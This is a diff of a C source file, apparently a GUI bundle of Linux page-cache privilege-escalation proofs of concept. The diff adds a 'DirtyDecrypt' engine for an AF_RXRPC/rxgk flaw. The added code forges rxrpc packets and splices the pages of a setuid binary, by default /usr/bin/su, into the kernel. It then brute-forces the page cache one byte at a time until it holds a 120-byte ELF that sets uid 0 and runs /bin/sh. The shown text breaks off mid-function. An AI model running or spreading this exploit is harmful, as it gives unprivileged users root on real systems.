@@ -1,8 +1,8 @@
 /* ============================================================================
- *  dirtyfrag-gui.c — DirtyChains 八链页缓存提权 PoC
+ *  dirtyfrag-gui.c — DirtyChains 九链页缓存提权 PoC
  *                    图形前端 + 内置引擎（单文件）
  *
- *  一个 .c 就能编出完整程序，不再需要额外的 .o，文件里合了四块：
+ *  一个 .c 就能编出完整程序，不再需要额外的 .o，文件里合了五块：
  *
  *      OVS 引擎（原 ovswrap.c 全文）
  *          CVE-2026-64531 net/openvswitch CT action 越界，入口 ovswrap_main
@@ -10,8 +10,10 @@
  *          CVE-2026-46300 xfrm/espintcp 页缓存改写，入口 fragnesia_main
  *      DirtyClone 引擎（上游 PoC 并入）
  *          CVE-2026-43503 xfrm/esp-over-udp 页缓存改写，入口 cve43503_main
+ *      DirtyDecrypt 引擎（上游 PoC 并入）
+ *          CVE-2026-31635 AF_RXRPC/rxgk 页缓存改写，入口 cve31635_main
  *      GTK3 前端（本项目前身 dirtyfrag-gui.c）
- *          八链下拉框 + pty 运行器 + ANSI 日志渲染，入口 main
+ *          九链下拉框 + pty 运行器 + ANSI 日志渲染，入口 main
  *
  *  编译（GUI）:
  *      gcc -O2 -Wall -o dirtychains dirtyfrag-gui.c \
@@ -66,6 +68,7 @@
 #include <linux/netlink.h>
 #include <net/if.h>
 #include <pwd.h>
+#include <poll.h>
 #include <sched.h>
 #include <signal.h>
 #include <stdarg.h>
@@ -83,6 +86,8 @@
 #include <unistd.h>
 #include <sys/ioctl.h>
 #include <sys/uio.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
 #include <linux/rtnetlink.h>
 #include <linux/xfrm.h>
 
@@ -3926,7 +3931,7 @@ static int dc_scan_setuid(void)
 #ifndef OVSWRAP_STANDALONE
 
 /* ============================================================================
- *  dirtyfrag-gui.c — DirtyChains 八链页缓存提权 PoC 的图形前端
+ *  dirtyfrag-gui.c — DirtyChains 九链页缓存提权 PoC 的图形前端
  *
  *  适配 XFCE 桌面 (GTK3)。它本身不做任何内核操作, 只负责:
  *      · 拼出正确的命令行
@@ -5854,10 +5859,860 @@ int cve43503_main(int argc, char **argv)
     return 0;
 }
 
+/* ==========================================================================
+ *  DirtyDecrypt 引擎：CVE-2026-31635（入口 cve31635_main）
+ *
+ *  代码取自上游 PoC（Ashraf Zaryouh "0xBlackash"），攻击逻辑保持原样，只动了
+ *  几处让它能安全地跑在 GUI 的子进程里：
+ *    · main() 改名 cve31635_main()，usage 单独一份，不和本文件其它入口撞名；
+ *    · 不再从固定表里自动挑靶子：目标由 -t 传入，默认 /usr/bin/su；
+ *    · 加 gate：普通文件、>= 4096 字节、uid=0、带 s 位、当前用户可读不可写、
+ *      非 nosuid 挂载，不满足直接 exit 2/4，避免把系统 su 打成后门；
+ *    · setup_ns() 里原来的 exit(1) 改成返回 -1，退出码交给调用者；
+ *    · 写之前把目标备份到 /tmp/.<名字>.<pid>，成功失败都保留并打印恢复命令；
+ *    · 新增 -check：只建 userns/netns 再走一遍 rxgk 握手，不 splice、不写文件；
+ *    · 新增 -find：只扫 setuid 靶子，复用 46300/43503 那份只读扫描。
+ *
+ *  原理：rxgk 安全类（security index 6）在 AF_RXRPC 收包时，把 splice 进 socket
+ *  的"载荷"——其实是目标文件的页——当成密文原地解密，明文直接落回 page cache。
+ *  每次 fire 换一个随机 AES128 key，解出来的字节近似随机，所以只能逐字节暴力
+ *  猜（约 1/256 命中），命中一个字节再换下一个。120 字节的 tiny ELF 通常要
+ *  几万次 fire，比 43503 的 48 次 SA 慢得多，日志里会按 8 字节报一次进度。
+ *
+ *  和 43503 的区别：43503 走 XFRM/ESP over UDP，一次 SA 定 4 字节；这条走
+ *  AF_RXRPC + rxgk，攻击面完全不同，只是共用"splice 文件页进协议栈"这个原语。
+ *
+ *  退出码（和主引擎一致）：
+ *    0 = 写成功（有漏洞） / 1 = 没打成或校验不过 / 2 = 参数或目标不合法
+ *    4 = 前置条件不满足（userns 被禁 / 无 AF_RXRPC / 无 rxgk / 目标可写）
+ * ==========================================================================*/
+
+#define DC31635_PAYLOAD_LEN     120
+#define DC31635_MIN_LEN         4096
+#define DC31635_MAX_TRIES       10000
+#define DC31635_SEC_INDEX       6       /* RXGK_SECURITY_INDEX */
+#define DC31635_ENCTYPE         17      /* ENCTYPE_AES128_CTS_HMAC_SHA1_96 */
+#define DC31635_AES_KEY_LEN     16
+#define DC31635_MAX_LEVEL       4       /* RXRPC_SECURITY_ENCRYPT */
+
+#ifndef AF_RXRPC
+#define AF_RXRPC                33
+#endif
+#ifndef SOL_RXRPC
+#define SOL_RXRPC               272
+#endif
+#define DC31635_OPT_SEC_KEY     1
+#define DC31635_OPT_MIN_LEVEL   4
+#define DC31635_OPT_USER_CALL   1
+#define DC31635_KEYRING_PROCESS (-2)
+#define DC31635_KEYCTL_UNLINK      9
+#define DC31635_KEYCTL_INVALIDATE  21
+
+#ifndef KEYCTL_UNLINK
+#define KEYCTL_UNLINK DC31635_KEYCTL_UNLINK
+#endif
+#ifndef KEYCTL_INVALIDATE
+#define KEYCTL_INVALIDATE DC31635_KEYCTL_INVALIDATE
+#endif
+
+static const char *dc31635_target = "/usr/bin/su";
+static int dc31635_verbose;
+static int dc31635_fires;
+
+/* rxgk 的 wire header，按上游 PoC 原样保留 */
+struct dc31635_wire_hdr {
+    uint32_t epoch;
+    uint32_t cid;
+    uint32_t callNumber;
+    uint32_t seq;
+    uint32_t serial;
+    uint8_t  type;
+    uint8_t  flags;
+    uint8_t  userStatus;
+    uint8_t  securityIndex;
+    uint16_t cksum;
+    uint16_t serviceId;
+} __attribute__((packed));
+
+/* sockaddr_rxrpc：不 include <linux/rxrpc.h>，免得和 net/if.h、netinet 打架 */
+struct dc31635_srx {
+    unsigned short srx_family;
+    uint16_t srx_service;
+    uint16_t transport_type;
+    uint16_t transport_len;
+    union {
+        unsigned short family;
+        struct sockaddr_in  sin;
+        struct sockaddr_in6 sin6;
+    } transport;
+};
+
+#define DC31635_PKT_DATA        1
+#define DC31635_PKT_CHALLENGE   6
+#define DC31635_LAST_PACKET     0x04
+
+/* 120 字节的 tiny ELF：setuid(0) → setgid(0) → setgroups(0) → execve("/bin/sh")。
+   ET_DYN + 整文件映射，入口 0x68，正好落在段内。 */
+static const uint8_t dc31635_elf[DC31635_PAYLOAD_LEN] = {
+    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x03,0x00,0x3e,0x00,0x01,0x00,0x00,0x00, 0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x38,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00, 0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00, 0x78,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x78,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0xb0,0x69,0x0f,0x05,
+    0x48,0x8d,0x3d,0xdd,0xff,0xff,0xff,
+    0x6a,0x3b,0x58,
+    0x0f,0x05,
+};
+
+/* --- rxgk token 的 XDR 拼装 --- */
+static void dc31635_put32(uint8_t **pp, uint32_t v)
+{
+    uint32_t nv = htonl(v);
+
+    memcpy(*pp, &nv, 4);
+    *pp += 4;
+}
+
+static void dc31635_put64(uint8_t **pp, uint64_t v)
+{
+    dc31635_put32(pp, (uint32_t)(v >> 32));
+    dc31635_put32(pp, (uint32_t)(v & 0xFFFFFFFFu));
+}
+
+static void dc31635_put_data(uint8_t **pp, const void *data, size_t len)
+{
+    size_t pad;
+
+    dc31635_put32(pp, (uint32_t)len);
+    memcpy(*pp, data, len);
+    *pp += len;
+    pad = (4 - (len & 3)) & 3;
+    if (pad) {
+        memset(*pp, 0, pad);
+        *pp += pad;
+    }
+}
+
+static int dc31635_build_token(uint8_t *out, size_t maxlen,
+                               const uint8_t *base_key, size_t keylen)
+{
+    uint8_t tok[512];
+    uint8_t *p = out, *tp = tok;
+    uint8_t ticket[8] = { 0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE };
+    struct timespec ts;
+    uint64_t now;
+    size_t toklen;
+
+    clock_gettime(CLOCK_REALTIME, &ts);
+    now = (uint64_t)ts.tv_sec * 10000000ULL + (uint64_t)ts.tv_nsec / 100ULL;
+
+    dc31635_put32(&p, 0);                       /* flags */
+    dc31635_put_data(&p, "poc.test", 8);        /* cell  */
+    dc31635_put32(&p, 1);                       /* ntoken */
+
+    dc31635_put32(&tp, DC31635_SEC_INDEX);
+    dc31635_put64(&tp, now);                    /* begintime */
+    dc31635_put64(&tp, now + 864000000000ULL);  /* endtime   */
+    dc31635_put64(&tp, 2);                      /* level = ENCRYPT */
+    dc31635_put64(&tp, 864000000000ULL);        /* lifetime  */
+    dc31635_put64(&tp, 0);                      /* bytelife  */
+    dc31635_put64(&tp, DC31635_ENCTYPE);        /* enctype   */
+    dc31635_put_data(&tp, base_key, keylen);    /* key       */
+    dc31635_put_data(&tp, ticket, sizeof(ticket));
+
+    toklen = (size_t)(tp - tok);
+    dc31635_put32(&p, (uint32_t)toklen);
+    memcpy(p, tok, toklen);
+    p += toklen;
+
+    if ((size_t)(p - out) > maxlen)
+        return -1;
+    return (int)(p - out);
+}
+
+static long dc31635_add_key(const char *desc, const uint8_t *base_key, size_t keylen)
+{
+    uint8_t buf[1024];
+    int n = dc31635_build_token(buf, sizeof(buf), base_key, keylen);
+
+    if (n < 0)
+        return -1;
+    return syscall(SYS_add_key, "rxrpc", desc, buf, (size_t)n,
+                   DC31635_KEYRING_PROCESS);
+}
+
+static void dc31635_drop_key(long key)
+{
+    if (key < 0)
+        return;
+    syscall(SYS_keyctl, KEYCTL_UNLINK, key, DC31635_KEYRING_PROCESS);
+    syscall(SYS_keyctl, KEYCTL_INVALIDATE, key);
+}
+
+/* userns + netns + lo up：和 43503 要的东西一模一样，直接复用那份实现 */
+static int dc31635_setup_ns(void)
+{
+    return dc43503_setup_ns();
+}
+
+static int dc31635_udp_server(uint16_t port)
+{
+    struct sockaddr_in sa;
+    int one = 1;
+    int s = socket(AF_INET, SOCK_DGRAM, 0);
+
+    if (s < 0)
+        return -1;
+    memset(&sa, 0, sizeof(sa));
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(port);
+    sa.sin_addr.s_addr = htonl(0x7F000001);
+    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+        close(s);
+        return -1;
+    }
+    return s;
+}
+
+static ssize_t dc31635_udp_recv(int s, void *buf, size_t cap,
+                                struct sockaddr_in *from, int timeout_ms)
+{
+    struct pollfd pfd;
+    socklen_t fl = (socklen_t)sizeof(*from);
+
+    pfd.fd = s;
+    pfd.events = POLLIN;
+    pfd.revents = 0;
+    if (poll(&pfd, 1, timeout_ms) <= 0)
+        return -1;
+    return recvfrom(s, buf, cap, 0, (struct sockaddr *)from,
+                    from ? &fl : NULL);
+}
+
+static int dc31635_rxrpc_client(uint16_t local_port, const char *keyname)
+{
+    struct dc31635_srx srx;
+    int min_level = DC31635_MAX_LEVEL;
+    int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
+
+    if (fd < 0)
+        return -1;
+    if (setsockopt(fd, SOL_RXRPC, DC31635_OPT_SEC_KEY,
+                   keyname, strlen(keyname)) < 0) {
+        close(fd);
+        return -1;
+    }
+    if (setsockopt(fd, SOL_RXRPC, DC31635_OPT_MIN_LEVEL,
+                   &min_level, sizeof(min_level)) < 0) {
+        close(fd);
+        return -1;
+    }
+
+    memset(&srx, 0, sizeof(srx));
+    srx.srx_family = AF_RXRPC;
+    srx.srx_service = 0;
+    srx.transport_type = SOCK_DGRAM;
+    srx.transport_len = (uint16_t)sizeof(struct sockaddr_in);
+    srx.transport.sin.sin_family = AF_INET;
+    srx.transport.sin.sin_port = htons(local_port);
+    srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
+
+    if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) {
+        close(fd);
+        return -1;
+    }
+    return fd;
+}
+
+static int dc31635_initiate(int cli_fd, uint16_t srv_port, uint16_t service_id)
+{
+    char data[] = "TESTDATA";
+    struct dc31635_srx srx;
+    char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
+    struct msghdr msg;
+    struct iovec iov;
+    struct cmsghdr *cmsg;
+    int fl, n;
+
+    memset(&srx, 0, sizeof(srx));
+    srx.srx_family = AF_RXRPC;
+    srx.srx_service = service_id;
+    srx.transport_type = SOCK_DGRAM;
+    srx.transport_len = (uint16_t)sizeof(struct sockaddr_in);
+    srx.transport.sin.sin_family = AF_INET;
+    srx.transport.sin.sin_port = htons(srv_port);
+    srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
+
+    memset(&msg, 0, sizeof(msg));
+    msg.msg_name = &srx;
+    msg.msg_namelen = (socklen_t)sizeof(srx);
+    iov.iov_base = data;
+    iov.iov_len = sizeof(data);
+    msg.msg_iov = &iov;
+    msg.msg_iovlen = 1;
+    msg.msg_control = cmsg_buf;
+    msg.msg_controllen = sizeof(cmsg_buf);
+    cmsg = CMSG_FIRSTHDR(&msg);
+    cmsg->cmsg_level = SOL_RXRPC;
+    cmsg->cmsg_type = DC31635_OPT_USER_CALL;
+    cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned long));
+    *(unsigned long *)CMSG_DATA(cmsg) = 0xDEAD;
+
+    fl = fcntl(cli_fd, F_GETFL);
+    fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);
+    n = (int)sendmsg(cli_fd, &msg, 0);
+    fcntl(cli_fd, F_SETFL, fl);
+
+    if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK)
+        return -1;
+    return 0;
+}
+
+/* 一次 fire：随机 key 建 SA → 起 UDP 假服务端 → 客户端发起 call → 收 challenge
+   → 把"文件页 + 伪造 DATA 头"拼进 pipe 发给内核。命中与否由调用方回读 map 判断 */
+static int dc31635_fire(int target_fd, off_t splice_off, size_t splice_len,
+                        const uint8_t *key, size_t keylen)
+{
+    static int seq;
+    char keyname[32];
+    struct dc31635_wire_hdr mal;
+    struct dc31635_wire_hdr *hdr;
+    struct sockaddr_in cli_addr, to, dst;
+    uint8_t pkt[2048];
+    uint8_t ch[sizeof(struct dc31635_wire_hdr) + 20];
+    struct dc31635_wire_hdr *c;
+    struct iovec viv;
+    uint32_t epoch, cid, callN;
+    uint16_t svc, cport;
+    int p[2], udp_srv, cli, ret = -1, i;
+    long k;
+    ssize_t n;
+
+    snprintf(keyname, sizeof(keyname), "rxgk%d", seq++);
+    k = dc31635_add_key(keyname, key, keylen);
+    if (k < 0)
+        return -1;
+
+    {
+        uint16_t port_s = (uint16_t)(10000 + (rand() % 27000) * 2);
+
+        udp_srv = dc31635_udp_server(port_s);
+        if (udp_srv < 0)
+            goto out_key;
+        cli = dc31635_rxrpc_client((uint16_t)(port_s + 1), keyname);
+        if (cli < 0)
+            goto out_udp;
+        if (dc31635_initiate(cli, port_s, 1234) < 0)
+            goto out_cli;
+    }
+
+    n = dc31635_udp_recv(udp_srv, pkt, sizeof(pkt), &cli_addr, 50);
+    if (n < (ssize_t)sizeof(struct dc31635_wire_hdr))
+        goto out_cli;
+
+    hdr = (struct dc31635_wire_hdr *)pkt;
+    epoch = ntohl(hdr->epoch);
+    cid   = ntohl(hdr->cid);
+    callN = ntohl(hdr->callNumber);
+    svc   = ntohs(hdr->serviceId);
+    cport = ntohs(cli_addr.sin_port);
+
+    /* challenge */
+    memset(ch, 0, sizeof(ch));
+    c = (struct dc31635_wire_hdr *)ch;
+    c->epoch = htonl(epoch);
+    c->cid = htonl(cid);
+    c->serial = htonl(0x10000);
+    c->type = DC31635_PKT_CHALLENGE;
+    c->securityIndex = DC31635_SEC_INDEX;
+    c->serviceId = htons(svc);
+    for (i = 0; i < 20; i++)
+        ch[sizeof(struct dc31635_wire_hdr) + i] = (uint8_t)(rand() & 0xFF);
+
+    memset(&to, 0, sizeof(to));
+    to.sin_family = AF_INET;
+    to.sin_port = htons(cport);
+    to.sin_addr.s_addr = htonl(0x7F000001);
+    sendto(udp_srv, ch, sizeof(ch), 0, (struct sockaddr *)&to, sizeof(to));
+
+    for (i = 0; i < 3; i++) {
+        struct sockaddr_in src;
+
+        if (dc31635_udp_recv(udp_srv, pkt, sizeof(pkt), &src, 5) < 0)
+            break;
+    }
+
+    /* 伪造 DATA：header 走 vmsplice，正文由 splice 直接从目标文件页拉进来 */
+    memset(&mal, 0, sizeof(mal));
+    mal.epoch = htonl(epoch);
+    mal.cid = htonl(cid);
+    mal.callNumber = htonl(callN);
+    mal.seq = htonl(1);
+    mal.serial = htonl(0x42000);
+    mal.type = DC31635_PKT_DATA;
+    mal.flags = DC31635_LAST_PACKET;
+    mal.securityIndex = DC31635_SEC_INDEX;
+    mal.serviceId = htons(svc);
+
+    memset(&dst, 0, sizeof(dst));
+    dst.sin_family = AF_INET;
+    dst.sin_port = htons(cport);
+    dst.sin_addr.s_addr = htonl(0x7F000001);
+    if (connect(udp_srv, (struct sockaddr *)&dst, sizeof(dst)) < 0)
+        goto out_cli;
+
+    if (pipe(p) < 0)
+        goto out_cli;
+
+    viv.iov_base = &mal;
+    viv.iov_len = sizeof(mal);
+    if (vmsplice(p[1], &viv, 1, 0) < 0) {
+        close(p[0]);
+        close(p[1]);
+        goto out_cli;
+    }
+    {
+        loff_t off = (loff_t)splice_off;
+
+        if (splice(target_fd, &off, p[1], NULL, splice_len,
+                   SPLICE_F_NONBLOCK) < 0) {
+            close(p[0]);
+            close(p[1]);
+            goto out_cli;
+        }
+    }
+    if (splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + splice_len, 0) < 0) {
+        close(p[0]);
+        close(p[1]);
+        goto out_cli;
+    }
+    close(p[0]);
+    close(p[1]);
+
+    usleep(1000);
+
+    /* 把 call 上的错误回收掉，否则下一次 add_key 会撞上残留状态 */
+    {
+        int fl = fcntl(cli, F_GETFL);
+
+        fcntl(cli, F_SETFL, fl | O_NONBLOCK);
+        for (i = 0; i < 2; i++) {
+            char rb[2048], ccb[256];
+            struct dc31635_srx srx;
+            struct msghdr m;
+            struct iovec iv;
+
+            memset(&m, 0, sizeof(m));
+            memset(&srx, 0, sizeof(srx));
+            iv.iov_base = rb;
+            iv.iov_len = sizeof(rb);
+            m.msg_name = &srx;
+            m.msg_namelen = (socklen_t)sizeof(srx);
+            m.msg_iov = &iv;
+            m.msg_iovlen = 1;
+            m.msg_control = ccb;
+            m.msg_controllen = sizeof(ccb);
+            recvmsg(cli, &m, 0);
+        }
+    }
+    dc31635_fires++;
+    ret = 1;
+
+out_cli:
+    close(cli);
+out_udp:
+    close(udp_srv);
+out_key:
+    dc31635_drop_key(k);
+    return ret;
+}
+
+/* -check 用：把 fire() 走到握手那一步就停，不 splice、不碰目标页 */
+static int dc31635_probe(void)
+{
+    uint8_t key[DC31635_AES_KEY_LEN];
+    uint8_t pkt[2048];
+    struct sockaddr_in from;
+    char keyname[32];
+    uint16_t base;
+    int udp = -1, cli = -1, ok = 0;
+    long k;
+
+    memset(key, 0, sizeof(key));
+    snprintf(keyname, sizeof(keyname), "rxgkprobe%d", (int)getpid());
+    k = dc31635_add_key(keyname, key, sizeof(key));
+    if (k < 0) {
+        fprintf(stderr, "[-] add_key(rxrpc/rxgk) 失败: %s\n"
+                        "    内核没编 CONFIG_RXGK，或 rxgk 安全类不可用\n",
+                strerror(errno));
+        return -1;
+    }
+
+    base = (uint16_t)(20000 + (getpid() % 20000));
+    udp = dc31635_udp_server(base);
+    if (udp < 0) {
+        fprintf(stderr, "[-] udp bind %u 失败: %s\n", (unsigned)base,
+                strerror(errno));
+        goto out;
+    }
+    cli = dc31635_rxrpc_client((uint16_t)(base + 1), keyname);
+    if (cli < 0) {
+        fprintf(stderr, "[-] AF_RXRPC 建链失败: %s\n    需要 CONFIG_AF_RXRPC\n",
+                strerror(errno));
+        goto out;
+    }
+    if (dc31635_initiate(cli, base, 1234) < 0) {
+        fprintf(stderr, "[-] sendmsg(AF_RXRPC) 失败: %s\n", strerror(errno));
+        goto out;
+    }
+    if (dc31635_udp_recv(udp, pkt, sizeof(pkt), &from, 100) > 0)
+        ok = 1;
+    else
+        fprintf(stderr, "[-] 没收到 rxrpc 首包（端口 %u）\n", (unsigned)base);
+
+out:
+    if (cli >= 0)
+        close(cli);
+    if (udp >= 0)
+        close(udp);
+    dc31635_drop_key(k);
+    return ok ? 0 : -1;
+}
+
+static int dc31635_gate(void)
+{
+    struct stat st;
+    int fd;
+
+    if (stat(dc31635_target, &st) < 0) {
+        fprintf(stderr, "gate_failed: stat %s: %s\n", dc31635_target,
+                strerror(errno));
+        return 2;
+    }
+    if (!S_ISREG(st.st_mode)) {
+        fprintf(stderr, "gate_failed: 不是普通文件\n");
+        return 2;
+    }
+    if (st.st_size < DC31635_MIN_LEN) {
+        fprintf(stderr, "gate_failed: 文件太小 size=%lld need>=%d\n",
+                (long long)st.st_size, DC31635_MIN_LEN);
+        return 2;
+    }
+    if (st.st_uid != 0 || !(st.st_mode & S_ISUID)) {
+        fprintf(stderr, "gate_failed: 不是 setuid root 文件 (uid=%u mode=%o)\n",
+                (unsigned)st.st_uid, (unsigned)(st.st_mode & 07777));
+        return 2;
+    }
+    if (access(dc31635_target, R_OK) != 0) {
+        fprintf(stderr, "gate_failed: 当前用户读不了它 (%s)\n", strerror(errno));
+        return 2;
+    }
+    if (dc_mount_nosuid(dc31635_target)) {
+        fprintf(stderr, "gate_failed: 目标在 nosuid 挂载上\n");
+        return 2;
+    }
+    errno = 0;
+    fd = open(dc31635_target, O_WRONLY | O_CLOEXEC);
+    if (fd >= 0) {
+        close(fd);
+        printf("gate_failed: 外层 write-open 意外成功（你是 root？）\n");
+        return 4;
+    }
+    printf("gate_ok: %s size=%lld uid=0 setuid=1 outer_write_open_denied=1\n",
+           dc31635_target, (long long)st.st_size);
+    return 0;
+}
+
+/* 逐字节暴力猜。每次 fire 换随机 key，命中判据是 mmap 出来的页里那个字节 */
+static int dc31635_write_payload(int rfd, const void *map, off_t file_size)
+{
+    const uint8_t *m = map;
+    struct timespec t0, t1;
+    uint8_t key[DC31635_AES_KEY_LEN];
+    uint64_t seed = (uint64_t)time(NULL) * 0x100000001ULL ^ (uint64_t)getpid();
+    double dt;
+    int i, start = 0, need, bad = 0;
+
+    for (i = 0; i < DC31635_PAYLOAD_LEN; i++) {
+        uint8_t cur = 0;
+
+        if (pread(rfd, &cur, 1, i) != 1) {
+            fprintf(stderr, "[-] 读目标失败: %s\n", strerror(errno));
+            return -1;
+        }
+        if (cur != dc31635_elf[i]) {
+            start = i;
+            break;
+        }
+        if (i == DC31635_PAYLOAD_LEN - 1) {
+            printf("[*] 页缓存内容已经一致, 不需要写\n");
+            return 0;
+        }
+    }
+
+    need = DC31635_PAYLOAD_LEN - start;
+    printf("[*] 开始写 %d 字节, 从偏移 %d 起（逐字节猜, 每字节最多 %d 次）\n",
+           need, start, DC31635_MAX_TRIES);
+
+    clock_gettime(CLOCK_MONOTONIC, &t0);
+    for (i = start; i < DC31635_PAYLOAD_LEN; i++) {
+        uint8_t want = dc31635_elf[i];
+        uint8_t cur = 0;
+        int ok = 0, att;
+
+        if (pread(rfd, &cur, 1, i) == 1 && cur == want && i > start)
+            continue;
+
+        for (att = 0; att < DC31635_MAX_TRIES && !ok; att++) {
+            size_t slen = 28;
+
+            seed ^= seed << 13;
+            seed ^= seed >> 7;
+            seed ^= seed << 17;
+            {
+                uint64_t r = seed;
+
+                seed ^= seed << 13;
+                seed ^= seed >> 7;
+                seed ^= seed << 17;
+                memcpy(key, &r, 8);
+                memcpy(key + 8, &seed, 8);
+            }
+
+            if ((off_t)i + (off_t)slen > file_size)
+                slen = (size_t)(file_size - (off_t)i);
+            if (slen < 16)
+                slen = 16;
+            if (slen > 28)
+                slen = 28;
+
+            if (dc31635_fire(rfd, (off_t)i, slen, key, sizeof(key)) == 1 &&
+                m[i] == want)
+                ok = 1;
+        }
+        if (!ok) {
+            fprintf(stderr, "[-] 第 %d/%d 字节没写进去（试了 %d 次）\n",
+                    i + 1, DC31635_PAYLOAD_LEN, DC31635_MAX_TRIES);
+            return -1;
+        }
+        if (dc31635_verbose || (i - start + 1) % 8 == 0 ||
+            i == DC31635_PAYLOAD_LEN - 1) {
+            clock_gettime(CLOCK_MONOTONIC, &t1);
+            dt = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
+            if (dt < 0.000001)
+                dt = 0.000001;
+            printf("[*] %3d/%d 字节  fires=%d  %.1fs  %.0f 次/秒\n",
+                   i - start + 1, need, dc31635_fires, dt,
+                   dc31635_fires / dt);
+        }
+    }
+
+    for (i = 0; i < DC31635_PAYLOAD_LEN; i++) {
+        uint8_t cur = 0;
+
+        if (pread(rfd, &cur, 1, i) != 1 || cur != dc31635_elf[i])
+            bad++;
+    }
+    clock_gettime(CLOCK_MONOTONIC, &t1);
+    dt = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
+    printf("[+] bytes_flip_summary len=%d mismatch=%d fires=%d %.1fs\n",
+           DC31635_PAYLOAD_LEN, bad, dc31635_fires, dt);
+    return bad == 0 ? 0 : -1;
+}
+
+/* 写之前先备份：页缓存脏页 5 秒后就会回写，出错时只能靠这份副本 + 重装包 */
+static int dc31635_backup(const char *path, char *out, size_t outlen)
+{
+    const char *base = strrchr(path, '/');
+    char buf[4096];
+    ssize_t n;
+    int src, dst;
+
+    base = base ? base + 1 : path;
+    snprintf(out, outlen, "/tmp/.%s.%d", base, (int)getpid());
+
+    src = open(path, O_RDONLY | O_CLOEXEC);
+    if (src < 0)
+        return -1;
+    dst = open(out, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
+    if (dst < 0) {
+        close(src);
+        return -1;
+    }
+    while ((n = read(src, buf, sizeof(buf))) > 0)
+        if (write(dst, buf, (size_t)n) != n)
+            break;
+    close(src);
+    close(dst);
+    return 0;
+}
+
+static void dc31635_usage(const char *prog)
+{
+    fprintf(stderr,
+        "usage: %s -start|-test|-check|-find [-t target] [-v]\n"
+        "  -check   只探测 userns/netns + AF_RXRPC + rxgk key, 不写任何文件\n"
+        "  -test    写 120 字节到目标页缓存并回读校验, 不 exec\n"
+        "  -start   写成功后 exec 目标\n"
+        "  -find    只列 setuid root 候选靶子, 不碰 userns/AF_RXRPC\n"
+        "  -t       目标文件, 默认 /usr/bin/su；需 setuid root、>= 4096 字节、\n"
+        "           对当前用户可读但不可写\n", prog);
+}
+
+int cve31635_main(int argc, char **argv)
+{
+    int mode = -1;              /* -1 未指定 / 0 start / 1 test / 2 check / 3 find */
+    char backup[256] = "";
+    struct stat st;
+    off_t file_size;
+    void *map;
+    int i, rfd, rc, status = 0;
+    pid_t pid;
+
+    for (i = 1; i < argc; i++) {
+        const char *s = argv[i];
+
+        if (!strcmp(s, "-start"))
+            mode = 0;
+        else if (!strcmp(s, "-test"))
+            mode = 1;
+        else if (!strcmp(s, "-check"))
+            mode = 2;
+        else if (!strcmp(s, "-find"))
+            mode = 3;
+        else if (!strcmp(s, "-t") && i + 1 < argc)
+            dc31635_target = argv[++i];
+        else if (!strcmp(s, "-v") || !strcmp(s, "--verbose"))
+            dc31635_verbose = 1;
+        else if (!strcmp(s, "-h") || !strcmp(s, "--help")) {
+            dc31635_usage("dirtychains");
+            return 2;
+        } else if (s[0] == '-' && s[1]) {
+            fprintf(stderr, "cve31635: 未知参数 %s\n", s);
+            return 2;
+        }
+    }
+    if (getenv("DIRTYFRAG_VERBOSE"))
+        dc31635_verbose = 1;
+
+    if (mode < 0) {
+        fprintf(stderr, "cve31635: 必须显式指定 -check / -test / -start / -find\n");
+        dc31635_usage("dirtychains");
+        return 2;
+    }
+    if (mode == 3)
+        return dc_scan_setuid();
+
+    srand((unsigned)time(NULL) ^ (unsigned)getpid());
+
+    printf("[*] uid=%d euid=%d target=%s\n",
+           (int)getuid(), (int)geteuid(), dc31635_target);
+
+    rc = dc31635_gate();
+    if (rc)
+        return rc;
+
+    if (mode == 2) {
+        pid = fork();
+        if (pid < 0) {
+            fprintf(stderr, "fork: %s\n", strerror(errno));
+            return 1;
+        }
+        if (pid == 0) {
+            if (dc31635_setup_ns() < 0)
+                _exit(4);
+            _exit(dc31635_probe() == 0 ? 0 : 4);
+        }
+        if (waitpid(pid, &status, 0) < 0)
+            return 1;
+        if (!WIFEXITED(status))
+            return 1;
+        printf("%s", WEXITSTATUS(status) == 0
+               ? "[+] 前置条件齐备: userns/netns + AF_RXRPC + rxgk key 均可用\n"
+               : "[-] 前置条件不满足\n");
+        return WEXITSTATUS(status);
+    }
+
+    rfd = open(dc31635_target, O_RDONLY | O_CLOEXEC);
+    if (rfd < 0) {
+        fprintf(stderr, "open %s: %s\n", dc31635_target, strerror(errno));
+        return 1;
+    }
+    if (fstat(rfd, &st) < 0) {
+        close(rfd);
+        return 1;
+    }
+    file_size = st.st_size;
+
+    map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd, 0);
+    if (map == MAP_FAILED) {
+        fprintf(stderr, "mmap: %s\n", strerror(errno));
+        close(rfd);
+        return 1;
+    }
+
+    if (dc31635_backup(dc31635_target, backup, sizeof(backup)) == 0)
